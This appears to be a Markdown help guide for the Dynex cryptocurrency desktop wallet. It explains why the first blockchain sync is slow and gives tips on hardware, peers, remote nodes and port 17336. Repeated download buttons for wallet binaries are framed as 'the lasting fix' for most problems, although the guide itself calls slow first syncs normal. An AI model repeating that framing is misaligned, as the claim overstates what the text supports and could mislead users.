<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Dynex Wallet's Slow First Sync

**The first time Dynex Wallet runs on a new install (or after a reset), it has to download and verify the entire Dynex blockchain history, which can take anywhere from a few minutes to several hours depending on your hardware, disk, and connection -- this is normal, and there are a few ways to speed it up.**

## You'll see this if...

You just installed Dynex Wallet, restored a wallet from seed on a new computer, or reset your blockchain data, and now you are watching a sync progress indicator climb slowly from zero toward the current block height. Your CPU fan might be spinning up, disk activity is high, and the wallet feels sluggish to interact with while this is happening. You are wondering whether this is expected or whether something is wrong.

This is different from a sync that has completely stopped moving -- if your block height is frozen rather than just slow, see [Dynex Wallet sync stuck at a block](./dynex-wallet-sync-stuck-at-block.md) instead.

## Why it happens

A first sync means the wallet's local node has no blockchain data yet and must fetch every block from genesis (or from a recent checkpoint, depending on the client) up to the current tip, verifying each one along the way. This is inherently a bigger job than the day-to-day syncing a wallet does once it is caught up, because:

- The total chain history grows over time, so every new user has more to download than users who set up earlier.
- Verification is CPU and disk intensive, not just a network download -- the wallet checks the validity of blocks and transactions as it processes them.
- Slower hard disk drives (especially older spinning HDDs rather than SSDs) can bottleneck this process even on a fast internet connection.
- A weak or congested internet connection limits how fast blocks can even arrive in the first place.
- Running many other demanding applications at the same time competes for the same CPU and disk resources.

None of this means anything is broken. It is the expected cost of running your own full node-backed wallet rather than relying on someone else's server.

## Step-by-step fix

1. **Check the minimum recommended hardware.** Dynex Wallet recommends a 64-bit system with 2+ cores, 8 GB RAM, and 5 GB of free disk space. If you are well below this, especially on RAM or disk type, sync will be noticeably slower.
2. **Free up disk space and close other heavy applications** so the wallet is not competing for I/O and CPU with other processes.
3. **Use a wired or strong Wi-Fi connection** rather than a weak or congested wireless signal during the initial sync window.
4. **Let it run uninterrupted.** Avoid putting the computer to sleep or closing the wallet mid-sync, since restarting from a partial state can sometimes cost you re-verification time.
5. **Watch the connection count.** If you have very few peers, sync will crawl regardless of your hardware -- check [Dynex Wallet shows no connections](./dynex-wallet-no-connections.md) if your peer count looks low.
6. **Consider switching to a remote node** instead of running a local one. A remote node means you are not downloading and verifying the whole chain yourself at all -- your wallet just queries an already-synced node for the data it needs. See [remote node vs local node](./dynex-remote-node-vs-local-node.md) for the tradeoffs.
7. **Verify port 17336 is open** if using a local node, since poor peer connectivity due to a blocked port will slow sync even on fast hardware -- see the [firewall and port guide](./dynex-wallet-firewall-port-17336.md).
8. **Update to Dynex Wallet v2.2.3**, available from the [download page](https://dynexwallet.org/download) or directly from the [v2.2.3 GitHub release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3). While v2.2.3's headline sync improvement is the watchdog for stuck syncs, the same release's general stability and connection handling improvements also help first-time syncs proceed more smoothly without silent stalls that would otherwise add to the wait.

## If that didn't work

If sync remains unreasonably slow for days rather than hours, despite meeting the hardware recommendations and having a decent connection, check whether your disk is failing or nearly full, both of which degrade write performance significantly. Run a basic disk health check if you suspect this.

If you suspect the slowness is really a disguised stall rather than genuine slow progress, compare block height readings a few minutes apart. If the number truly never changes, treat it as a stuck sync instead and follow [those steps](./dynex-wallet-sync-stuck-at-block.md).

For a no-local-sync alternative entirely, the [remote nodes documentation](https://dynexwallet.org/docs/remote-nodes) walks through pointing your wallet at a remote node so you can start sending and receiving almost immediately, accepting the small tradeoff of trusting that node for data rather than verifying everything yourself.

## Prevent it next time

If you expect to reinstall or move computers occasionally, keep a note of a reliable remote node option so you are not stuck waiting on a full local sync every time. If you prefer running a local node for its stronger trust model, consider doing the first sync on a wired connection before taking a laptop somewhere with weaker Wi-Fi. Keeping at least 10-15% of your disk free beyond the stated 5 GB requirement also helps avoid performance cliffs as the chain continues to grow.

## FAQ

### How long should a first sync normally take?
It varies widely by hardware and connection, from well under an hour on a fast SSD and good internet to several hours on older or constrained hardware. What matters is steady progress, not a specific target time.

### Can I use the wallet while it's syncing?
You can view the interface, but balances and transaction history will be incomplete or outdated until sync finishes, and sending transactions before full sync is not recommended.

### Does a remote node skip syncing entirely?
Yes, with a remote node your wallet does not download the chain itself; it queries a node that is already synced, so you can transact almost immediately.

### Will closing my laptop pause or ruin the sync?
Pausing is fine; it typically resumes close to where it left off. It generally will not "ruin" anything, though an improper shutdown during heavy disk writes carries a small risk of needing to [reset blockchain data](./reset-dynex-blockchain-data.md) if the local database becomes inconsistent.

### Is a slow sync a sign my wallet file is corrupted?
No, slow sync relates to chain download and verification, not the wallet file itself, which holds your keys and transaction records separately.

### Does more RAM really make a difference?
Yes, within reason -- verification and caching benefit from more available memory, and systems below the 8 GB recommendation are more likely to swap to disk, which slows everything down further.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it from the official release page, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [sync and network guides on dynexwallet.org](https://dynexwallet.org/troubleshooting/sync-stalled).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [Dynex Wallet Sync Stuck at a Block](./dynex-wallet-sync-stuck-at-block.md) |
| [Dynex Wallet Shows No Connections](./dynex-wallet-no-connections.md) |
| [Dynex Remote Node vs Local Node: Which Should You Use?](./dynex-remote-node-vs-local-node.md) |
| [The Dynex Wallet Recovery Seed, Explained](./dynex-recovery-seed-explained.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
